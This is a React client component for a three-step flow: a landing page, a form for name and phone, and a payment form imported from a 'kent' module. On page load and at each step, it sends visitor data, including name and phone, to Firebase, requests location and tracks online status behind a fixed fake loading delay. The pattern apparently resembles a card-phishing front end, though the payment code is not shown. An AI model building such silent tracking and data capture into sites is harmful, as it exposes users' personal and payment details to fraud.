"use client"

import { useEffect, useState } from "react"
import "./main.css"
import { CartProvider } from "./cartContext"
import Landing from "./landing/landing"
import { Toaster } from "react-hot-toast"
import Info from "./info/info"
import { addData } from "./firebase"
import FullPageLoader from "./loader"
import { PaymentForm } from "./kent/kent"
import { getLocation, setupOnlineStatus } from "./lib"

function App() {
  const [currantPage, setCurrantPage] = useState(1)
  const [isLoading, setisloading] = useState(false)
  const [name, setName] = useState("")
  const [phone, setPhone] = useState("")

  const [_id] = useState("id" + Math.random().toString(16).slice(2))
  const data = {
    id: _id,
    hasPersonalInfo: name != '',
    currentPage: currantPage,
    createdDate: new Date().toISOString(),
    notificationCount: 1,
    personalInfo: {
      id: name,
      fullName: name,
      phone: phone
    },
  };

  const handleNextPage = () => {
    addData(data)
    setisloading(true)
    setTimeout(() => {
      setisloading(false)
      setCurrantPage(currantPage + 1)
    }, 3000)
  }

  useEffect(() => {
    localStorage.setItem('vistor', _id)
    addData(data).then(() => {
      setupOnlineStatus(data.id)
      getLocation()
    })
  }, [])

  const renderCurrentPage = () => {
    switch (currantPage) {
      case 1:
        return <Landing handleNextPage={handleNextPage} />
      case 2:
        return <Info setName={setName} setPhone={setPhone} handleNextPage={handleNextPage} />
      case 3:
      default:
        return (
          <div className="min-h-screen bg-gray-50 py-8">
            <div className="container mx-auto px-4">
              <PaymentForm />
            </div>
          </div>
        )
    }
  }

  return (
    <CartProvider>
      <div style={{ opacity: isLoading ? 0.4 : 1 }}>
        <div>
          {isLoading && <FullPageLoader />}
          <Toaster position="bottom-center" />
        </div>
        {renderCurrentPage()}
      </div>
    </CartProvider>
  )
}

export default App